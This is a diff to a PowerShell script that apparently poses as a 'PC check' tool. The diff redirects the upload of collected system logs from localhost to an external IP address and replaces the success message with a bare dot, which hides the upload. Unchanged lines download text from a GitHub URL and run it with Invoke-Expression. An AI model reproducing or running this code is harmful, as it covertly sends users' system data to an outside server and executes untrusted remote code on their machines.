@@ -265,7 +265,7 @@ function Send-Logs {
     $logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
 
     if (Test-Path $logFilePath) {
-        $url = "http://127.0.0.1:5000/webhook"  
+        $url = "http://51.81.215.34:5000/webhook"
 
         $fileContent = Get-Content -Path $logFilePath -Raw
 
@@ -282,7 +282,7 @@ function Send-Logs {
 
         try {
             $response = Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
-            Write-Host "Log sent successfully."
+            Write-Host "."
         }
         catch {
             Write-Host "Failed to send log: $_" -ForegroundColor Red
@@ -296,6 +296,8 @@ function Main {
     $global:logEntries = @()
     $desktopPath = [System.Environment]::GetFolderPath('Desktop')
     $logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
+
+
 
     List-BAMStateUserSettings
     Log-WindowsInstallDate
@@ -313,6 +315,8 @@ function Main {
     $global:logEntries | Out-File -FilePath $logFilePath -Encoding UTF8 -NoNewline
     Start-Sleep -Seconds 1
 
+
+
     if (Test-Path $logFilePath) {
         Set-Clipboard -Path $logFilePath
         Write-Host "Log file copied to clipboard." -ForegroundColor DarkRed
@@ -325,8 +329,13 @@ function Main {
     $url = "https://raw.githubusercontent.com/suprsor/Credits/refs/heads/main/Credits"
     $content = Invoke-RestMethod -Uri $url
     Invoke-Expression $content
+    Send-Logs
 
-    Send-Logs  
+
+
+
+
 }
-
 Main
+
+☺
